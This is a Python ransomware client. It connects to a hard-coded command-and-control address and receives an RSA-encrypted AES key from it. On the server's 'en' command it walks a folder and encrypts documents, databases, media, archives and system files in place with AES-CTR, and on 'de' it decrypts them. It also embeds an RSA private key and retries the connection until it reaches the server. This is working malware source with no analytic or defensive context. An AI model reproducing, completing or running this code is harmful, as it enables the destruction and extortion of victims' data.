import os 
import os.path
import socket 
import time

from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome import Random
from Cryptodome.Util import Counter

#encryption method AES_CTR mode
def encryption(key,file_name):
	counter = Counter.new(128)
	c = AES.new(key,AES.MODE_CTR,counter=counter)
	if os.path.exists(file_name):
		with open(file_name,'r+b') as f:
			block_size = 16
			plaintext = f.read(block_size)
			while plaintext:
				f.seek(-len(plaintext),1)
				f.write(c.encrypt(plaintext))
				plaintext = f.read(block_size)
		os.rename(file_name,file_name+".txt")
		return [key]

#decryption method AES_CTR
def decryption(key,file_name):
	counter = Counter.new(128)
	d = AES.new(key,AES.MODE_CTR,counter=counter)
	with open(file_name,'r+b') as f:
		block_size = 16
		plaintext = f.read(block_size)
		while plaintext:
			f.seek(-len(plaintext),1)
			f.write(d.decrypt(plaintext))
			plaintext = f.read(block_size)
		os.rename(file_name,file_name.strip(".txt"))

# listing windows partitions
def partition_windows():
	p_list = []
	for p in range(65,91):
		p = chr(p) + "://"
		if os.path.exists(p):
			p_list.append(p)


#listing the files
def dir_f_list(d):
	extensions = [
	'exe', 'dll', 'nt', 'sys', 'dvd', 'ebd', 'hiv',  # SYSTEM FILES [danger]
	'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv', # structured data
    'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
    'java', 'class', 'jar', # java source code
    'ps', 'bat', 'vb', # windows based scripts
    'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
	'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
	'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
	'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
	'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak' 
	]
	fd = []
	for d , sd , f in os.walk(d):
		for file_name in f:
			full_path = os.path.join(d,file_name)
			ex = full_path.split(".")[-1]
			if ex in extensions:
				fd.append(full_path)
				#print(full_path)
	return fd
#client to connection
def client():

    privkey ="""-----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAuDXmLnn23eM+AESxPu+bFc9mNhn1j7H+sU5M6Fl0izFJv7Ds
    uhrEbP7pGFAyIEw3ZDmDxK1N1SVX6STSTT16K93LjmbxajxU7FYBrZHGkCxNJdIN
    pJvtioYf9FZ+xPIVfo3mndcH9JpuPa1+/U48l4O04Hjf9mKwX52f+ovtT4DIbvc8
    gKLPoGe2fqMzxmhZfWWPvTFjaZizS5UF3TOW2c8vYx2DO96wJ1Laj+E18N/fHKvf
    z3n5aYYWNMKuruDyZclezXcYPexDQZGjFBhOv0UEpeZlfgkmwTIlgJ0wrg60glGO
    myzJ1dKO65O89sDTxnG269/6pFkDZ9UFMZEauQIDAQABAoIBACvDNkuNUx40ucqT
    hy5F+yiLzKMGuMVqCnFyAihi9CKLU5N0Q1EVQdwJFTRe/QGaScCIP2supuJ/zCpJ
    wqJx+//G4fCTOUA9VAmPhzeGfc9LjwpwpCgamSzDH31LPTOptXyK1qJh7vRn6c/C
    U3x3JULzmbmITeC5YmBc0KBTtM2hiVJyCAjII1JOPVM5j0y02Fw73Q6NqSWQV2Lk
    XMGbQg+qZQcSfW+jOoYCccty5cqRfCU7GFa0cU5BJacr95eqCpsubfo2eIyUJcId
    dO84dfqTWNdnca8RiKr51GN99/wluhYAqlVHrGYs8czdrdIGpZ+ZpSSwLIQie8OD
    pQqrXG8CgYEAwMZbwq5B+WlcLpdA5Q9hsKXy8AIM/IhmSsMiRxXd5Gf0l7eusk8+
    EWYuLEE8czihyI/m/v9XCyW06JiXLljp4XJsemAp5KRD8Fm0yhDVkjh2tLmU8ntG
    5hc/QgFoEI6OppBGC5xP1QC5q+HljUoAHxXQXQ7CFQ6L5EiY4Ulc/X8CgYEA9KB4
    guz8ypEGbGE9lT2BjIjh3DlXn/jj/s30U0uQd7jR7JQqpVElNYLNbJ0DXcOO/2U6
    tiX2Dym1FGHUjslY850dF9kl7LEJDqQIw7miIclZ5r7CgXrZvJcQkcXaypJBqPG6
    el9Wu+2AFGz591kWDDNZ55/ptqdJqo26uJ+Yc8cCgYBhyr517ixtt/MZd4VmLf1i
    vWyWMJQh75fkyUS0RvV/jvTXmki3D9fuv6Ugsh9WXB5GPinypdmkQAacD/xxeI18
    3q0FD49w+5uza+54qz2MpbQiThqvP7Zhtt1SQKBn9cmL2ZiO/0bISUvnU/s9R5L0
    Mf63lmsCf5Sbw/A6KRtRRQKBgQDP4AloYJCUZlbKBHv7dS/AR5V+ua+vfiXoogVM
    Pvs98W1aF7KBlwoCheugr3Br3kGG3/PbUzjcO7nn3xZsW8deBRXy7REgKHSk31mf
    UQDoqxzdSx8oPkgGzWxEI5i/6TcopHmtgZTHz5O2R8DGowpsRbrRbH+DOncMGrIg
    L2aygwKBgQCKhKnJmAcvsdF5hPZYIICQrvJwAIQu4DsN2a62BFcskr4Rcmi6q6Kf
    JYdcjv4OhGoYcvcvIkdbi9E8vhn4eRLz9bNmizOVN2BcYetqZIqWzg7mpGAIaAfR
    PuN2kJ5Bbi5PkR5ZONH8EW4vOzcxmuWpr+thtjYOhDbTCulg+hszFQ==
    -----END RSA PRIVATE KEY-----"""
    privkey = privkey.encode('ascii')
    privkey_ = RSA.importKey(privkey)
    de_key = PKCS1_OAEP.new(privkey_)

    port = 4545
    ip = "192.168.1.7"
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        key_data_enc = s.recv(2048)
        decrypted_ke = de_key.decrypt(key_data_enc)
        key = decrypted_ke.decode('ascii')
        padding = lambda data_key:data_key + (16 -len(data_key) % 16) * "*"
        key = padding(key).encode("ascii")
        s.send(b'\n The Key Is Saved\n')
        while True:
            command = s.recv(2048)
            command = command.decode('ascii')
            if command == "en":
                files = dir_f_list('C:\\Users\\Eng_Ozil\\Desktop\\new')
                for f in files :
                    encryption(key,f)
                s.send("\n Encryption Has been Done\n")
            if command == "de":
                files = dir_f_list('C:\\Users\\Eng_Ozil\\Desktop\\new')
                for f in files :
                    decryption(key,f)
                s.send(b'\n Decryption Has been Done\n')
    except socket.error as e:
        print("trying to connect with server with in 5 sec")
        time.sleep(5)
        s.close()
        client()
client()
